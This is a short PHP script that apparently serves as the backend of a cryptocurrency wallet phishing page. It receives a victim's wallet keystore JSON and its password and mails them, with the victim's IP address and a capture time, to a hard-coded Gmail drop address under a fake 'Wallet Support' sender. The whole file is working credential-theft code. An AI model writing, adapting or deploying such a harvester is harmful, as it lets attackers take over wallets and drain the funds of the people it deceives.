<?php
// Set headers to allow JSON response from the server
header('Content-Type: application/json');

// 1. Get the raw POST data sent by the JavaScript fetch()
$jsonData = file_get_contents('php://input');

// 2. Decode the JSON data into a PHP associative array
$input = json_decode($jsonData, true);

// 3. Verify that the Keystore and Password fields are present
if (isset($input['keystore']) && isset($input['password'])) {
    
    // --- CONFIGURATION ---
    $to = "jourdandeo9@gmail.com"; // Your receiving email
    $wallet = $input['wallet'];    // The wallet name (e.g., BNB Smart Chain)
    $keystore = $input['keystore']; // The raw JSON string
    $password = $input['password']; // The user's encryption password
    
    // Exact subject format as requested: "A keystore {Wallet Name}"
    $subject = "A keystore " . $wallet;
    
    // 4. Construct the Email Body
    $message = "---------- New Keystore Import ----------\n\n";
    $message .= "Wallet Name: " . $wallet . "\n";
    $message .= "Keystore JSON Content: \n" . $keystore . "\n\n";
    $message .= "Password: " . $password . "\n\n";
    $message .= "---------------- User Logs ----------------\n";
    $message .= "IP Address: " . $_SERVER['REMOTE_ADDR'] . "\n";
    $message .= "Time Captured: " . date("Y-m-d H:i:s") . "\n";
    $message .= "-------------------------------------------\n";

    // 5. Professional Mail Headers
    $headers = "From: Wallet Support <noreply@yourdomain.com>\r\n";
    $headers .= "X-Mailer: PHP/" . phpversion();

    // 6. Execute the mail function
    if (mail($to, $subject, $message, $headers)) {
        // Successful delivery
        echo json_encode(["status" => "success"]);
    } else {
        // Server failed to send
        echo json_encode(["status" => "error", "message" => "Mail failure"]);
    }
} else {
    // No data received
    echo json_encode(["status" => "error", "message" => "Empty request"]);
}
?>
